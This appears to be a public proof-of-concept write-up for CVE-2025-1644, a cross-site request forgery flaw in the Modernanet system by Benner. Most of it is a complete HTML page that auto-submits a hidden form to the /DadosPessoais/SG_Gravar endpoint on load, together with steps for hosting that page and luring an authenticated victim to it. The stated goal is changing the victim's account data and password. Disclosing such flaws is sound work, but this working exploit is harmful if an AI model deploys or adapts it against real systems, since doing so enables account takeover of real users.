# CVE-2025-1644
The Modernanet System by Benner is vulnerable to Cross-Site Request Forgery.

**Affected Version: < 1.1.1**

**OBS: The malicius request only works with true data!**


## POC

This vulnerability resides in the /DadosPessoais/SG_Gravar page in Various personal data fields (e.g., DADOS_PESSOAIS_USER_NAME, DADOS_PESSOAIS_CPF, etc.),

It's possible to manipulate the request and trick authenticated users into unknowingly performing action.

In this case, it is possible to carry out an attack, which, if done correctly, 
can change the password of any authenticated user on the website.


## First Step

We have to create a malicious server, to lure the victim.

---


## Malicious server

**pay attention, in the value fields that have 'VALID INFORMATION', it is absolutely necessary to enter true information, as the backend performs validations, if it is not inserted, this will generate an error and it won't work**

```html
<!DOCTYPE html>
<html>
<head>
<title>PoC CSRF</title>
</head>
<body onload="document.getElementById('csrfForm').submit()">
  <form id="csrfForm" method="GET" action="https://*.modernanet.com.br/DadosPessoais/SG_Gravar">
    <input type="hidden" name="idItAg" value="">
    <input type="hidden" name="idItAgPagto" value="">
    <input type="hidden" name="DADOS_PESSOAIS_USER_NAME" value="email@GMAIL.COM">
    <input type="hidden" name="DADOS_PESSOAIS_USER_PASSWORD" value="">
    <input type="hidden" name="DADOS_PESSOAIS_USER_PASSWORD_RETYPE" value="">
    <input type="hidden" name="DADOS_PESSOAIS_IDPESFIS" value="119642">
    <input type="hidden" name="DADOS_PESSOAIS_IDPESPLA" value="204354">
    <input type="hidden" name="DADOS_PESSOAIS_CPF" value="A VALID CPF">
    <input type="hidden" name="DADOS_PESSOAIS_DATANASC_DATE" value="10/10/2000">
    <input type="hidden" name="DADOS_PESSOAIS_DATANASC_TIME" value="">
    <input type="hidden" name="DADOS_PESSOAIS_NOME" value="TEST">
    <input type="hidden" name="DADOS_PESSOAIS_SEXO" value="F">
    <input type="hidden" name="DADOS_PESSOAIS_EMPRESA" value="TEST">
    <input type="hidden" name="DADOS_PESSOAIS_RG" value="111111111111">
    <input type="hidden" name="DADOS_PESSOAIS_CONVENIO" value="11">
    <input type="hidden" name="DADOS_PESSOAIS_PLANO" value="5">
    <input type="hidden" name="DADOS_PESSOAIS_CODIGO_CONVENIO" value="">
    <input type="hidden" name="DADOS_PESSOAIS_PAI" value="">
    <input type="hidden" name="DADOS_PESSOAIS_MAE" value="TEST">
    <input type="hidden" name="DADOS_PESSOAIS_ENDER_ID" value="0">
    <input type="hidden" name="DADOS_PESSOAIS_TIPOEND" value="1">
    <input type="hidden" name="txtDADOS_PESSOAIS_CEP" value="A VALID ZIP CODE">
    <input type="hidden" name="txtDADOS_PESSOAIS_CIDADE" value="CITY">
    <input type="hidden" name="txtDADOS_PESSOAIS_BAIRRO" value="neighborhood">
    <input type="hidden" name="DADOS_PESSOAIS_LOGRADOURO" value="STREET">
    <input type="hidden" name="DADOS_PESSOAIS_NUMERO" value="">
    <input type="hidden" name="DADOS_PESSOAIS_COMPLEMENTO" value="">
    <input type="hidden" name="DADOS_PESSOAIS_QTDE_TELEFONES" value="2">
    <input type="hidden" name="DADOS_PESSOAIS_FONE_ID_0" value="138552">
    <input type="hidden" name="DADOS_PESSOAIS_TIPOFONE_0" value="3">
    <input type="hidden" name="DADOS_PESSOAIS_PREFIXO_0" value="12">
    <input type="hidden" name="DADOS_PESSOAIS_NUMFONE_0" value="12313-1231">
    <input type="hidden" name="DADOS_PESSOAIS_FONE_ID_1" value="138551">
    <input type="hidden" name="DADOS_PESSOAIS_TIPOFONE_1" value="1">
    <input type="hidden" name="DADOS_PESSOAIS_PREFIXO_1" value="18">
    <input type="hidden" name="DADOS_PESSOAIS_NUMFONE_1" value="1081-8923">
    <input type="hidden" name="DADOS_PESSOAIS_INT_ID" value="33675">
    <input type="hidden" name="DADOS_PESSOAIS_INT_ENDERECO" value="email@GMAIL.COM">
    <input type="hidden" name="DADOS_PESSOAIS_INT_PERM" value="S">
    <input type="hidden" name="DADOS_PESSOAIS_INT_PREFER" value="[object Object]">
  </form>
</body>
</html>
```

---

## Second Step

We have to send the link of our server to the victim, **the victim have to be authenticated**.
When the victim clicks in the link, their info it's automatically changed to known info.

end.


## Full url
https://IP/DadosPessoais/SG_Gravar

---

## Reference

https://modernasistemas.com.br/
